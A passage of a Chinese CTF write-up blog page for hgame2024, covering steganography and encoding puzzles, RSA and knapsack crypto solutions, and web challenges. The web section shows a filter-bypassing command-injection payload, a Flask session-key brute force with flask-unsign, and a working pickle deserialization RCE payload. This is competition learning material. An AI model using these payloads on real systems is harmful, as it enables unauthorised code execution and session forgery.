don&#x27;t</span><br><span class="hljs-comment">believe us . Mrs Anderson of Indiana tried us and says</span><br><span class="hljs-comment">&quot;Now I&#x27;m rich, Rich, RICH&quot; . This offer is 100% legal</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">. Sign up a friend and your friend will be rich too</span><br><span class="hljs-comment">. God Bless ! Dear Colleague ;</span> We know you are interested<br>in receiving amazing information <span class="hljs-comment">! If you are not interested</span><br><span class="hljs-comment">in our publications and wish to be removed from our</span><br><span class="hljs-comment">lists, simply do NOT respond and ignore this mail !</span><br><span class="hljs-comment">This mail is being sent in compliance with Senate bill</span><br><span class="hljs-comment">1619 , Title 7 , Section 303 ! This is not multi-level</span><br><span class="hljs-comment">marketing . Why work for somebody else when you can</span><br><span class="hljs-comment">become rich within 37 days ! Have you ever noticed</span><br><span class="hljs-comment">nobody is getting any younger plus people love convenience</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this .</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">140% plus deliver goods right to the customer&#x27;s doorstep</span><br><span class="hljs-comment">. You can begin at absolutely no cost to you . But</span><br><span class="hljs-comment">don&#x27;t believe us ! Mrs Simpson of Illinois tried us</span><br><span class="hljs-comment">and says &quot;I was skeptical but it worked for me&quot; . We</span><br><span class="hljs-comment">are licensed to operate in all states ! Because the</span><br><span class="hljs-comment">Internet operates on &quot;Internet time&quot; you must make</span><br><span class="hljs-comment">a commitment soon ! Sign up a friend and you get half</span><br><span class="hljs-comment">off ! Thank-you for your serious consideration of our</span><br><span class="hljs-comment">offer . Dear Friend ;</span> We know you are interested in<br>receiving amazing info <span class="hljs-comment">! We will comply with all removal</span><br><span class="hljs-comment">requests . This mail is being sent in compliance with</span><br><span class="hljs-comment">Senate bill 2716 , Title 5 , Section 303 ! This is</span><br><span class="hljs-comment">not a get rich scheme . Why work for somebody else</span><br><span class="hljs-comment">when you can become rich within 52 days ! Have you</span><br><span class="hljs-comment">ever noticed how many people you know are on the Internet</span><br><span class="hljs-comment">and the baby boomers are more demanding than their</span><br><span class="hljs-comment">parents ! Well, now is your chance to capitalize on</span><br><span class="hljs-comment">this . WE will help YOU decrease perceived waiting</span><br><span class="hljs-comment">time by 170% and turn your business into an E-BUSINESS</span><br><span class="hljs-comment">. You are guaranteed to succeed because we take all</span><br><span class="hljs-comment">the risk ! But don&#x27;t believe us ! Mrs Anderson who</span><br><span class="hljs-comment">resides in Alabama tried us and says &quot;Now I&#x27;m rich,</span><br><span class="hljs-comment">Rich, RICH&quot; ! We are a BBB member in good standing</span><br><span class="hljs-comment">. So make yourself rich now by ordering immediately</span><br><span class="hljs-comment">! Sign up a friend and you get half off ! Thanks .</span><br><span class="hljs-comment">Dear Salaryman ;</span> Especially for you - this red-hot<br>news <span class="hljs-comment">! We will comply with all removal requests . This</span><br><span class="hljs-comment">mail is being sent in compliance with Senate bill 1618</span><br><span class="hljs-comment">, Title 4 , Section 308 . THIS IS NOT MULTI-LEVEL MARKETING</span><br><span class="hljs-comment">. Why work for somebody else when you can become rich</span><br><span class="hljs-comment">inside 27 days ! Have you ever noticed nearly every</span><br><span class="hljs-comment">commercial on television has a .com on in it &amp; nearly</span><br><span class="hljs-comment">every commercial on television has a .com on in it</span><br><span class="hljs-comment">! Well, now is your chance to capitalize on this !</span><br><span class="hljs-comment">WE will help YOU decrease perceived waiting time by</span><br><span class="hljs-comment">180% plus turn your business into an E-BUSINESS . You</span><br><span class="hljs-comment">can begin at absolutely no cost to you ! But don&#x27;t</span><br><span class="hljs-comment">believe us ! Prof Ames who resides in Washington tried</span><br><span class="hljs-comment">us and says &quot;I was skeptical but it worked for me&quot;</span><br><span class="hljs-comment">. We assure you that we operate within all applicable</span><br><span class="hljs-comment">laws ! We implore you - act now . Sign up a friend</span><br><span class="hljs-comment">and you&#x27;ll get a discount of 10% . Thank-you for your</span><br><span class="hljs-comment">serious consideration of our offer ! Dear Friend ;</span><br>This letter was specially selected to be sent to you<br><span class="hljs-comment">! If you no longer wish to receive our publications</span><br><span class="hljs-comment">simply reply with a Subject: of &quot;REMOVE&quot; and you will</span><br><span class="hljs-comment">immediately be removed from our club ! This mail is</span><br><span class="hljs-comment">being sent in compliance with Senate bill 1622 , Title</span><br><span class="hljs-comment">7 ;</span> Section <span class="hljs-number">303</span> <span class="hljs-comment">! Do NOT confuse us with Internet scam</span><br><span class="hljs-comment">artists . Why work for somebody else when you can become</span><br><span class="hljs-comment">rich in 10 weeks ! Have you ever noticed people will</span><br><span class="hljs-comment">do almost anything to avoid mailing their bills &amp; people</span><br><span class="hljs-comment">love convenience ! Well, now is your chance to capitalize</span><br><span class="hljs-comment">on this . WE will help YOU turn your business into</span><br><span class="hljs-comment">an E-BUSINESS &amp; SELL MORE . You can begin at absolutely</span><br><span class="hljs-comment">no cost to you ! But don&#x27;t believe us . Mr Ames of</span><br><span class="hljs-comment">Louisiana tried us and says &quot;Now I&#x27;m rich, Rich, RICH&quot;</span><br><span class="hljs-comment">. We are licensed to operate in all states . We BESEECH</span><br><span class="hljs-comment">you - act now . Sign up a friend and you&#x27;ll get a discount</span><br><span class="hljs-comment">of 50% ! Thank-you for your serious consideration of</span><br><span class="hljs-comment">our offer .</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.spammimic.com/decode.cgi">https://www.spammimic.com/decode.cgi</a></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">籱籰籪籶籮粄簹籴籨粂籸籾籨籼簹籵籿籮籨籪籵簺籨籽籱簼籨籼籮籬类簼籽粆<br></code></pre></td></tr></table></figure>
+<p>转unicode</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x7c71;</span><span class="hljs-symbol">&amp;#x7c70;</span><span class="hljs-symbol">&amp;#x7c6a;</span><span class="hljs-symbol">&amp;#x7c76;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c84;</span><span class="hljs-symbol">&amp;#x7c39;</span><span class="hljs-symbol">&amp;#x7c74;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c82;</span><span class="hljs-symbol">&amp;#x7c78;</span><span class="hljs-symbol">&amp;#x7c7e;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7c;</span><span class="hljs-symbol">&amp;#x7c39;</span><span class="hljs-symbol">&amp;#x7c75;</span><span class="hljs-symbol">&amp;#x7c7f;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c6a;</span><span class="hljs-symbol">&amp;#x7c75;</span><span class="hljs-symbol">&amp;#x7c3a;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7d;</span><span class="hljs-symbol">&amp;#x7c71;</span><span class="hljs-symbol">&amp;#x7c3c;</span><span class="hljs-symbol">&amp;#x7c68;</span><span class="hljs-symbol">&amp;#x7c7c;</span><span class="hljs-symbol">&amp;#x7c6e;</span><span class="hljs-symbol">&amp;#x7c6c;</span><span class="hljs-symbol">&amp;#x7c7b;</span><span class="hljs-symbol">&amp;#x7c3c;</span><span class="hljs-symbol">&amp;#x7c7d;</span><span class="hljs-symbol">&amp;#x7c86;</span><br></code></pre></td></tr></table></figure>
+<p>取后两位数字</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">71</span> <span class="hljs-number">70</span> <span class="hljs-number">6</span>a <span class="hljs-number">76</span> <span class="hljs-number">6</span>e <span class="hljs-number">84</span> <span class="hljs-number">39</span> <span class="hljs-number">74</span> <span class="hljs-number">68</span> <span class="hljs-number">82</span> <span class="hljs-number">78</span> <span class="hljs-number">7</span>e <span class="hljs-number">68</span> <span class="hljs-number">7</span>c <span class="hljs-number">39</span> <span class="hljs-number">75</span> <span class="hljs-number">7</span>f <span class="hljs-number">6</span>e <span class="hljs-number">68</span> <span class="hljs-number">6</span>a <span class="hljs-number">75</span> <span class="hljs-number">3</span>a <span class="hljs-number">68</span> <span class="hljs-number">7</span>d <span class="hljs-number">71</span> <span class="hljs-number">3</span>c <span class="hljs-number">68</span> <span class="hljs-number">7</span>c <span class="hljs-number">6</span>e <span class="hljs-number">6</span>c <span class="hljs-number">7</span>b <span class="hljs-number">3</span>c <span class="hljs-number">7</span>d <span class="hljs-number">86</span> <br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-string">&#x27;71 70 6a 76 6e 84 39 74 68 82 78 7e 68 7c 39 75 7f 6e 68 6a 75 3a 68 7d 71 3c 68 7c 6e 6c 7b 3c 7d 86 &#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a.split(<span class="hljs-string">&#x27; &#x27;</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i,<span class="hljs-number">16</span>)-<span class="hljs-number">9</span>),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#hgame&#123;0k_you_s0lve_al1_th3_secr3t&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="龙之舞"><a href="#龙之舞" class="headerlink" title="龙之舞"></a>龙之舞</h3><p>频谱图上下镜像翻转<br><img src="/mdimg/hgame2024/1707833030899-302cedf1-0932-4d2c-8746-8fa791e73676.png" srcset="/img/loading.gif" lazyload><br><code>5H8w1nlWCX3hQLG</code><br>deepsound<br>得到gif，分离出4部分二维码然后拼接<br><a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">https://merri.cx/qrazybox/</a><br>用tools的<img src="/mdimg/hgame2024/1708005124237-203dcb84-5ac0-4a09-bdcd-422912282fe1.png" srcset="/img/loading.gif" lazyload>模块<br><img src="/mdimg/hgame2024/1708005147696-3eb7f8a4-b9b5-4a03-9c39-a83aafc43822.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="crypto-1"><a href="#crypto-1" class="headerlink" title="crypto"></a>crypto</h2><h3 id="midRSA"><a href="#midRSA" class="headerlink" title="midRSA"></a>midRSA</h3><p>把flag泄露出来了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a= <span class="hljs-number">13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-comment">#b&#x27;hgame&#123;0ther_cas3s_0f_c0ppr3smith&#125;\xff\xff\xff\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure>
+<h3 id="backpack"><a href="#backpack" class="headerlink" title="backpack"></a>backpack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>enc = <span class="hljs-number">871114172567853490297478570113449366988793760172844644007566824913350088148162949968812541218339</span><br>a = [<span class="hljs-number">3245882327</span>, <span class="hljs-number">3130355629</span>, <span class="hljs-number">2432460301</span>, <span class="hljs-number">3249504299</span>, <span class="hljs-number">3762436129</span>, <span class="hljs-number">3056281051</span>, <span class="hljs-number">3484499099</span>, <span class="hljs-number">2830291609</span>, <span class="hljs-number">3349739489</span>, <span class="hljs-number">2847095593</span>, <span class="hljs-number">3532332619</span>, <span class="hljs-number">2406839203</span>, <span class="hljs-number">4056647633</span>, <span class="hljs-number">3204059951</span>, <span class="hljs-number">3795219419</span>, <span class="hljs-number">3240880339</span>, <span class="hljs-number">2668368499</span>, <span class="hljs-number">4227862747</span>, <span class="hljs-number">2939444527</span>, <span class="hljs-number">3375243559</span>]<br>bag = <span class="hljs-number">45893025064</span><br><br><span class="hljs-comment"># Reconstruct p</span><br>p = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> prime <span class="hljs-keyword">in</span> a:<br>    <span class="hljs-keyword">if</span> bag % prime == <span class="hljs-number">0</span>:<br>        p |= <span class="hljs-number">1</span><br>    p &lt;&lt;= <span class="hljs-number">1</span><br>    bag //= prime<br><br>p &gt;&gt;= <span class="hljs-number">1</span>  <span class="hljs-comment"># Remove the extra left shift at the end of the loop</span><br><br><span class="hljs-comment"># Decrypt the ciphertext</span><br>dec = enc ^ p<br><br>flag = long_to_bytes(dec)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#hgame&#123;M@ster_0f ba3kpack_m4nag3ment!&#125;</span><br><br></code></pre></td></tr></table></figure>
+<h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h3><p>可以命令执行<br>fuzz一下，可以用反引号和print<br><code>print </code>ls /<code> ![image.png](https://cdn.nlark.com/yuque/0/2024/png/34530682/1707750297248-77be3528-f6c3-44eb-979a-27325b47f6d2.png#averageHue=%23f5f4f4&amp;clientId=u3965e437-4ef0-4&amp;from=paste&amp;height=269&amp;id=uc37aa524&amp;originHeight=336&amp;originWidth=457&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=11644&amp;status=done&amp;style=none&amp;taskId=ue892b01c-5e66-46b8-8824-8c28377dad0&amp;title=&amp;width=365.6) flag在`flag_is_here/flag_c0w54y` 过滤了flag `print `tac /f*/f*</code></p>
+<h3 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, send_file<br><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">from</span> pytz <span class="hljs-keyword">import</span> timezone<br><br>currentDateAndTime = datetime.now(timezone(<span class="hljs-string">&#x27;Asia/Shanghai&#x27;</span>))<br>currentTime = currentDateAndTime.strftime(<span class="hljs-string">&quot;%H%M%S&quot;</span>)<br><br>app = Flask(__name__)<br><span class="hljs-comment"># Tips: Try to crack this first ↓</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = currentTime<br><span class="hljs-built_in">print</span>(currentTime)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span><br>    <span class="hljs-keyword">return</span> send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/flag&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;There is no session available in your client :(&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="hljs-built_in">format</span>(session[<span class="hljs-string">&#x27;username&#x27;</span>])<br>    <br>    <span class="hljs-comment"># For POST requests from admin</span><br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        pickle_data=base64.b64decode(request.form.get(<span class="hljs-string">&#x27;pickle_data&#x27;</span>))<br>        <span class="hljs-comment"># Tips: Here try to trigger RCE</span><br>        userdata=pickle.loads(pickle_data)<br>        <span class="hljs-keyword">return</span> userdata<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Access Denied&#x27;</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></td></tr></table></figure>
+<p>看源码一目了然就是session伪造加pickle反序列化<br>session的key为当前时间<code>app.config[&#39;SECRET_KEY&#39;] = currentTime</code><br>靶机开启时脚本运行key就被创建，以靶机创建时间为key<br>看开靶机时的大概时间，如23：56：则前后试试<br>也可以用<code>flask-unsign</code>直接爆破<br>GitHub下载源码然后<code>python setup.py install</code><br>生成字典</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打开文件准备写入</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-comment"># 循环生成密码</span><br>    <span class="hljs-keyword">for</span> number <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>        <span class="hljs-comment"># 生成6位随机数，不足前面补0</span><br>        password = <span class="hljs-built_in">format</span>(number, <span class="hljs-string">&#x27;06d&#x27;</span>)<br>        <span class="hljs-comment"># 将密码写入文件</span><br>        file.write(password + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;密码生成完成。&quot;</span>)<br><br></code></pre></td></tr></table></figure>
+<p><code>flask-unsign --unsign --cookie &#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.Zc40VA.I1YZ3EhqqmkBJpga_wgyLGYS7UI&#39; --no-literal-eval --wordlist 1.txt</code><br><img src="/mdimg/hgame2024/1708088303765-e90ba744-eea1-4a03-972f-d0a99db4d8ae.png" srcset="/img/loading.gif" lazyload><br><code>235654</code><br>或者手打<br><img src="/mdimg/hgame2024/1708013439710-efc80eb1-21e2-4740-a440-f671496951b9.png" srcset="/img/loading.gif" lazyload><br>然后用伪造的session<br><img src="/mdimg/hgame2024/1708013603038-c3d0da69-3f88-4da4-b46a-4ba6310284fe.png" srcset="/img/loading.gif" lazyload><br>然后报错构造反序列化，要在linux跑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>		<span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /flag&#x27;).read())&quot;</span>,))<br>a=A()<br>test=pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(test))<br><span class="hljs-comment">#b&#x27;gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw7cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ3RhYyAvZmxhZycpLnJlYWQoKSmUhZRSlC4=&#x27;</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/hgame2024/1708013297126-cc77305d-a4ba-4e68-9eff-30cf7d2b4b94.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/%E6%AF%94%E8%B5%9BWrite-Up/" class="category-chain-item">比赛Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9BWrite-Up/">#比赛Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>hgame2024</div>
+      <div>http://example.com/2024/02/16/hgame2024/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>J_0k3r</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/23/KnightCTF%202024/" title="KnightCTF 2024 wp">
+                        <span class="hidden-mobile">KnightCTF 2024 wp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
